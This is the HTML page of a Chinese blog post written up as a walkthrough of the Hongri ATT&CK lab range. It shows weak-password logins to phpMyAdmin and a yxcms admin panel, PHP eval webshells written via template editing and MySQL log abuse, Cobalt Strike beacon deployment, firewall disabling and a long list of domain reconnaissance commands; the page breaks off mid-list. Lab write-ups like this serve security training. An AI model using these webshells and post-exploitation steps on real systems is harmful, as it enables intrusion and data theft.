@@ -1,0 +1,340 @@
+<!DOCTYPE html><html lang="zh_CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>ATT&amp;CK1 | css_0k的博客</title><meta name="keywords" content="内网渗透,红日靶场"><meta name="author" content="css_0k"><meta name="copyright" content="css_0k"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="内网环境搭建加上我们的攻击机一共是四台主机  整个大内网环境配置：仅主机模式   192.168.52.0&#x2F;24  win7和winServer网络配置如下图  然后是配置我们的win7 也就是Web服务器   内外网连通的主机 要配两张网卡  一个内网IP 一个外网IP   NAT是外网网卡  net0用于内网  攻击机kali配置：   Web服务器渗透信息收集实战中获得的只有外网IP  从这">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ATT&amp;CK1">
+<meta property="og:url" content="https://css0k.github.io/2023/03/16/ATT&CK1/index.html">
+<meta property="og:site_name" content="css_0k的博客">
+<meta property="og:description" content="内网环境搭建加上我们的攻击机一共是四台主机  整个大内网环境配置：仅主机模式   192.168.52.0&#x2F;24  win7和winServer网络配置如下图  然后是配置我们的win7 也就是Web服务器   内外网连通的主机 要配两张网卡  一个内网IP 一个外网IP   NAT是外网网卡  net0用于内网  攻击机kali配置：   Web服务器渗透信息收集实战中获得的只有外网IP  从这">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s1.ax1x.com/2022/05/08/O1qq6f.jpg">
+<meta property="article:published_time" content="2023-03-16T01:30:28.000Z">
+<meta property="article:modified_time" content="2023-03-16T15:04:37.919Z">
+<meta property="article:author" content="css_0k">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="红日靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2022/05/08/O1qq6f.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://css0k.github.io/2023/03/16/ATT&amp;CK1/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ATT&CK1',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-03-16 23:04:37'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s1.ax1x.com/2022/05/07/OlMpE4.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">49</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">38</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s1.ax1x.com/2022/05/08/O1qq6f.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">css_0k的博客</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ATT&amp;CK1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-03-16T01:30:28.000Z" title="Created 2023-03-16 09:30:28">2023-03-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-03-16T15:04:37.919Z" title="Updated 2023-03-16 23:04:37">2023-03-16</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ATT&amp;CK1"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="内网环境搭建"><a href="#内网环境搭建" class="headerlink" title="内网环境搭建"></a>内网环境搭建</h1><p>加上我们的攻击机一共是四台主机</p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316120450609.png" alt="image-20230316120450609"></p>
+<p>整个大内网环境配置：仅主机模式   192.168.52.0/24</p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316121143192.png" alt="image-20230316121143192"></p>
+<p>win7和winServer网络配置如下图</p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316120947465.png" alt="image-20230316120947465"></p>
+<p>然后是配置我们的win7 也就是Web服务器   内外网连通的主机</p>
+<p>要配两张网卡  一个内网IP 一个外网IP   NAT是外网网卡  net0用于内网</p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316121933970.png" alt="image-20230316121933970"></p>
+<p>攻击机kali配置：</p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316123524234.png" alt="image-20230316123524234"></p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316123453240.png" alt="image-20230316123453240"></p>
+<h1 id="Web服务器渗透"><a href="#Web服务器渗透" class="headerlink" title="Web服务器渗透"></a>Web服务器渗透</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>实战中获得的只有外网IP  从这个点进行渗透</p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316122325442.png" alt="image-20230316122325442"></p>
+<p>运行phpstudy  打开网站访问</p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316120150746.png" alt="image-20230316120150746"></p>
+<p>看到phpstudy探针  说明网站使用phpstudy搭建的</p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316122457855.png" alt="image-20230316122457855"></p>
+<h3 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h3><p>nmap扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV -Pn 192.168.62.159</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316124035413.png" alt="image-20230316124035413"></p>
+<p>可以看到开放了80和3306端口</p>
+<p>发现开放80端口证明存在http网站</p>
+<p>开放了3306端口，存在mysql数据库，可能存在弱口令</p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316123619804.png" alt="image-20230316123619804"></p>
+<p>访问外网IP</p>
+<p>可以在探针这检测mysql是否有弱口令  发现存在  root root</p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316124520534.png" alt="image-20230316124520534"></p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316124527503.png"></p>
+<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>然后我们扫描一下目录  探测一下还有哪些</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ./dirmap.py -i http://192.168.62.159/ -lcf </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316132549545.png"></p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316132450070.png" alt="image-20230316132450070"></p>
+<p>可以看到有一个备份文件、php 版本文件和 phpmyadmin 目录</p>
+<p>访问备份文件下载  发现文件名叫yxcms  猜测也是该网站的一个目录</p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316132735370.png" alt="image-20230316132735370"></p>
+<h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p>尝试访问yxcms  发现确实有这个目录  而且有信息泄露</p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316132927529.png" alt="image-20230316132927529"></p>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h3><p>访问phpmyadmin目录 尝试用弱口令root root登录  成功</p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316124802641.png" alt="image-20230316124802641"></p>
+<p>又是弱口令root root 登录</p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316124831502.png" alt="image-20230316124831502"></p>
+<p>通过信息泄露我们登录后台地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">123456</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316135354729.png" alt="image-20230316135354729"></p>
+<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>前台留言本输入后在后台管理中弹窗</p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316140137907.png" alt="image-20230316140137907"></p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316140225879.png" alt="image-20230316140225879"></p>
+<h3 id="任意文件读写"><a href="#任意文件读写" class="headerlink" title="任意文件读写"></a>任意文件读写</h3><p>尝试在模板编辑 写入一句话木马文件</p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316141501143.png" alt="image-20230316141501143"></p>
+<p>然后去下载的备份文件中查找文件路径进行访问利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/yxcms/protected/apps/default/view/default/zf.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316142049707.png" alt="image-20230316142049707"></p>
+<p>尝试访问 phpinfo();    成功打印php版本</p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316142259110.png" alt="image-20230316142259110"></p>
+<p>蚁剑连</p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316142528281.png" alt="image-20230316142528281"></p>
+<p>下面是另一种方法：</p>
+<h3 id="phpmyadmin全局日志getshell"><a href="#phpmyadmin全局日志getshell" class="headerlink" title="phpmyadmin全局日志getshell"></a>phpmyadmin全局日志getshell</h3><p>phpmyadmin后台getshell的常用手段有以下几种方式：</p>
+<blockquote>
+<p>1、select into outfile直接写入</p>
+<p>2、开启全局日志getshell</p>
+<p>3、使用慢查询日志getsehll</p>
+<p>4、使用错误日志getshell</p>
+<p>5、利用phpmyadmin4.8.x本地文件包含漏洞getshell</p>
+</blockquote>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316143010155.png" alt="image-20230316143010155"></p>
+<h4 id="1-尝试select-into-outfile直接写入"><a href="#1-尝试select-into-outfile直接写入" class="headerlink" title="1.尝试select into outfile直接写入"></a>1.尝试select into outfile直接写入</h4><p>使用sql查询语句执行 检索信息</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span>;       #查看数据库是否有导入权限，看能否直接导入木马</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316143221547.png" alt="image-20230316143221547"></p>
+<h4 id="2-开启全局日志getshell"><a href="#2-开启全局日志getshell" class="headerlink" title="2.开启全局日志getshell"></a>2.开启全局日志getshell</h4><p>发现没有写入权限，无法用select into outfile方法写入shell。我们再来看一下第二种方法，利用全局变量general_log去getshell</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> &quot;%general%&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316150048576.png" alt="image-20230316150048576"></p>
+<p>可以看到general_log值为OFF   但我们可以通过sql语句来改变他的值</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> &quot;on&quot;;     #开启日志</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;C:/phpStudy/WWW/yxcms/hack.php&#x27;</span>;		# 设置日志位置为网站目录</span><br></pre></td></tr></table></figure>
+
+<p>成功修改<img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316150511573.png" alt="image-20230316150511573"></p>
+<p>写入一句话木马</p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316150716926.png" alt="image-20230316150716926"></p>
+<p>蚁剑查看确认</p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316150730054.png" alt="image-20230316150730054"></p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316150809075.png" alt="image-20230316150809075"></p>
+<p>然后这样也可以连接蚁剑（上面蚁剑是之前连上为了确认我们写入成功的）</p>
+<h4 id="3-使用慢查询日志getsehll"><a href="#3-使用慢查询日志getsehll" class="headerlink" title="3.使用慢查询日志getsehll"></a>3.使用慢查询日志getsehll</h4><p>MySQL的慢查询日志是MySQL提供的一种日志记录，它用来记录在MySQL中响应时间超过阀值的语句。</p>
+<p>long_query_time的默认值为10，意思是运行10S以上的语句。</p>
+<p>该值可以指定为微秒的分辨率。具体指运行时间超过long_query_time值的SQL，则会被记录到慢查询日志中。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%slow%&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316151447350.png" alt="image-20230316151447350"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> slow_query_log<span class="operator">=</span><span class="keyword">on</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316151730851.png" alt="image-20230316151730851"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php @eval($_POST[zf1]);?&gt;&#x27;</span> <span class="keyword">or</span> sleep(<span class="number">10</span>); </span><br></pre></td></tr></table></figure>
+
+<p>写入后访问  也可以连上蚁剑 getshell</p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316152338931.png" alt="image-20230316152338931"></p>
+<h1 id="CobaltStrike搭建"><a href="#CobaltStrike搭建" class="headerlink" title="CobaltStrike搭建"></a>CobaltStrike搭建</h1><p>安装java环境</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y java-1.8.0-openjdk*</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316154336894.png" alt="image-20230316154336894"></p>
+<p>附执行权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chmod a+x agscript</span><br><span class="line">chmod a+x c2lint</span><br><span class="line">chmod a+x peclone</span><br><span class="line">chmod a+x teamserver</span><br></pre></td></tr></table></figure>
+
+<p>然后启动服务器端提供服务 </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver [serverIP] [passwd]</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316191240103.png" alt="image-20230316191240103"></p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316191534769.png" alt="image-20230316191534769"></p>
+<p>然后连接服务端</p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316191713882.png" alt="image-20230316191713882"></p>
+<p>监听服务端 </p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316192848213.png" alt="image-20230316192848213"></p>
+<p>可以看到已经连接了</p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316191901902.png" alt="image-20230316191901902"></p>
+<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>可以发现我们拿到的是管理员权限shell</p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316152830328.png" alt="image-20230316152830328"></p>
+<p>然后生成beacon</p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316192021837.png" alt="image-20230316192021837"></p>
+<p>将生成的beacon传到遭受攻击的主机</p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316192102611.png" alt="image-20230316192102611"></p>
+<p>关闭防火墙  执行文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316192121411.png" alt="image-20230316192121411"></p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316192201559.png" alt="image-20230316192201559"></p>
+<p>可以看到已经有主机上线了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep 1   #降低延时 快速交互</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316193108856.png" alt="image-20230316193108856"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell whoami    #查看当前用户权限</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316193242719.png" alt="image-20230316193242719"></p>
+<p>然后我们继续提升权限为system用户</p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316193445739.png" alt="image-20230316193445739"></p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316193513500.png" alt="image-20230316193513500"></p>
+<p>上线之后就是要信息收集了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br><span class="line">关闭防火墙</span><br><span class="line"></span><br><span class="line">shell netstat -ano</span><br><span class="line">查看开放端口</span><br><span class="line"></span><br><span class="line">shell systeminfo</span><br><span class="line">查看系统信息</span><br><span class="line"></span><br><span class="line">shell ipconfig/all</span><br><span class="line">查看网络信息</span><br><span class="line"></span><br><span class="line">shell whoami</span><br><span class="line">查看用户信息</span><br><span class="line"></span><br><span class="line">shell whoami/all</span><br><span class="line">查看所有用户信息</span><br><span class="line"></span><br><span class="line">shell hostname</span><br><span class="line">获取dns信息</span><br><span class="line"></span><br><span class="line">shell net view</span><br><span class="line">查看当前局域网中的计算机列表</span><br><span class="line"></span><br><span class="line">shell net user</span><br><span class="line">查看当前计算机中的用户</span><br><span class="line"></span><br><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</span><br><span class="line">查询操作系统及软件信息</span><br><span class="line"></span><br><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br><span class="line">查看系统体系结构</span><br><span class="line"></span><br><span class="line">powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name, version&quot;</span><br><span class="line">使用PowerShell收集软件的版本信息</span><br><span class="line"></span><br><span class="line">whoami &amp;&amp; whoami /priv</span><br><span class="line">查看当前权限</span><br><span class="line"></span><br><span class="line">wmic service list brief</span><br><span class="line">查询本机服务信息</span><br><span class="line"></span><br><span class="line">wmic product get name, version </span><br><span class="line">查看安装的软件的版本、路径等</span><br><span class="line"></span><br><span class="line">wmic process list brief</span><br><span class="line">查询进程信息</span><br><span class="line"></span><br><span class="line">wmic startup get command,caption</span><br><span class="line">查看启动程序信息</span><br><span class="line"></span><br><span class="line">shell tasklist</span><br><span class="line">查看常见的杀毒软件进程</span><br><span class="line"></span><br><span class="line">shell net view /domain</span><br><span class="line">查看主域信息</span><br><span class="line"></span><br><span class="line">shell net time /domain</span><br><span class="line">查看时间服务器</span><br><span class="line"></span><br><span class="line">shell net config workstation</span><br><span class="line">查看当前的登录域与用户信息</span><br><span class="line"></span><br><span class="line">shell nslookup god.org</span><br><span class="line">寻找域dns服务器ip</span><br><span class="line"></span><br><span class="line">shell ping -a god.org</span><br><span class="line">ping dns服务器</span><br><span class="line"></span><br><span class="line">shell net user /domain</span><br><span class="line">获取当前域内的用户</span><br><span class="line"></span><br><span class="line">shell wmic useraccount get /all</span><br><span class="line">获取域内用户的详细信息</span><br><span class="line"></span><br><span class="line">shell net group &quot;domain computers&quot; /domain</span><br><span class="line">查看当前域成员计算机列表</span><br><span class="line"></span><br><span class="line">shell net group &quot;domain admins&quot; /domain</span><br><span class="line">查看域管理员的用户组</span><br><span class="line"></span><br><span class="line">shell net group &quot;Enterprise admins&quot; /domain</span><br><span class="line">查询域系统管理员用户组</span><br><span class="line"></span><br><span class="line">shell net group &quot;domain controllers&quot; /domain</span><br><span class="line">查看域控制器</span><br><span class="line"></span><br><span class="line">shell net accounts /domain</span><br><span 